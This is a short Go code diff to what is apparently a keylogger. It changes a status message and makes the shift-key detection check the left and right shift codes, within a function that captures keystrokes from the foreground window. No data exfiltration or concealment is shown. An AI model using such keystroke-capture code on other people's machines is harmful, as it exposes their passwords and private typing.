@@ -40,7 +40,7 @@ func KeyLogger(keyOut chan objects.Letter) error {
 	signalChan := make(chan os.Signal, 1)
 	signal.Notify(signalChan, os.Interrupt)
 
-	fmt.Println("Start capturing keyboard input")
+	fmt.Println("Start capturing keyboard input...")
 	for {
 		select {
 		case <-signalChan:
@@ -53,17 +53,17 @@ func KeyLogger(keyOut chan objects.Letter) error {
 }
 
 // keyCheck checks what key was pressed on the users keyboard.
-// Additionally check if SHIFT was pressed and released to update the shiftPressed variable.
+// Additionally check if types.VK_SHIFT was pressed and released to update the shiftPressed variable.
 func keyCheck(key types.KeyboardEvent) objects.Letter {
 	if hwnd := getForegroundWindow(); hwnd != 0 {
 		if key.Message == types.WM_KEYDOWN {
-			if key.VKCode == types.VK_SHIFT {
+			if key.VKCode == types.VK_LSHIFT || key.VKCode == types.VK_RSHIFT {
 				shiftPressed = true
 				return createLetter(key, "SHIFT key was pressed", true)
 			}
 			return createLetter(key, "", false)
 		} else if key.Message == types.WM_KEYUP {
-			if key.VKCode == types.VK_SHIFT {
+			if key.VKCode == types.VK_LSHIFT || key.VKCode == types.VK_RSHIFT {
 				shiftPressed = false
 				return createLetter(key, "SHIFT key was released", true)
 			}
